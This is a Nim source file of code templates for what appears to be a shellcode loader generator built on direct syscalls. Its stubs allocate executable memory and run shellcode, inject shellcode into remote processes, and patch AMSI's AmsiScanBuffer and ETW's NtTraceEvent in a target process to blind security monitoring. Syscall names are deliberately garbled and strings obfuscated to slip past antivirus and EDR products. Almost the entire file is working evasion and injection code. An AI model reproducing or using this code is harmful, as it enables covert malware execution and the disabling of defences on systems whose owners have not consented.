import strformat

let WhispersStub * = """


import whispers/syscalls

"""

let WhispersJumpStub * = """


import whispers/syscallsjump

"""


let WhispersLocalInjectStub*  = """
                

proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
        g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

    when defined(amd64):

        when defined(DInvoke):
            let tProcess = MyGetCurrentProcessId()
            var pHandle: HANDLE = MyGetCurrentProcess()
        else:
            let tProcess = GetCurrentProcessId()
            var pHandle: HANDLE = GetCurrentProcess()
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)


        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] Allocated a page of memory with RWX perms")

        var 
            bytesWritten: SIZE_T

        status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] oqiazasusjk - wrote bytes ") & fmt"{bytesWritten}"
                
            
        let f = cast[proc(){.nimcall.}](buffer)
        f()

when isMainModule:
     pwndemWhispersLike(dectext)

"""

let WhispersRemotePatchAMSIStub* = """

proc remoteLoadAmsi(processID: var DWORD): bool =

   
    # C:\windows\system32\amsi.dll
    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] oqiahsjynmxkla: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)
    if(status == 0):
      return true
    else:
      return false


proc RemotePatchAmsi(hProcss :HANDLE): bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get amsi.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[*] Applying Syscall ETW patch")

    var 
        bytesWritten: SIZE_T

    var outLength: SIZE_T
    status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

    if not NT_SUCCESS(status):
        echo obf("[-] Failed to write memory.")
    else:
        echo obf("[+] oqiazasusjk Succeed!")
                
    status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[+] OldProtect set back")
        disabled = true
    return disabled

when isMainModule:
    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchAmsi(hProcams)
    if (success == 0):
        success = remoteLoadAmsi(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchAmsi(hProcams)
    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

"""

let WhispersRemotePatchETWStub* = """

proc remoteLoadNtdll(processID: var DWORD): bool =

    # C:\windows\system32\ntdll.dll
    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] oqiahsjynmxkla: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)
    if(status == 0):
      return true
    else:
      return false


proc RemotePatchEtw(hProcess : HANDLE) : bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get ntdll.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("NtTraceEvent"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'NtTraceEvent'")
        return disabled

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[*] Applying Syscall ETW patch")

    var 
        bytesWritten: SIZE_T

    var outLength: SIZE_T
    status = oqiazasusjk(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

    if not NT_SUCCESS(status):
        echo obf("[-] Failed to write memory.")
    else:
        echo obf("[+] oqiazasusjk Succeed!")
                

    status = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[+] OldProtect set back")
        disabled = true

    return disabled

when isMainModule:
    when defined(DInvoke):
        var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    else:
        var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchEtw(hProcetw)
    if (success == 0):
        success = remoteLoadNtdll(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchEtw(hProcetw)
    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
    
"""


let WhispersShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let WhispersShellcoderemoteinjectStub * = """
    
    when defined(DInvoke):
        let tProcess2 = MyGetCurrentProcessId()
        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    else:
        let tProcess2 = GetCurrentProcess()
        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)


    var oldProtection: DWORD = 0


    var status: NTSTATUS
    var success: BOOL

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] opqiwepoausdasdjl: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")


    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)

    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let WhispersShellcoderemoteinjectStub_customprocfirst * = fmt"""

var remoteProcID: DWORD = 0

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

var processID: DWORD
var found: bool = false

"""

let WhispersShellcoderemoteinjectStub_customprocID * = """

for m in remoteprocesses:
    if found == true: continue
    echo obf("Checking: ") & $m
    processID = FindPidByName(m)
    if (processID):
        found = true

echo obf("[*] Target Process: "), processID
remoteProcID = processID

"""

let WhispersShellcoderemoteinjectStub_customprocthird * = fmt"""
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""
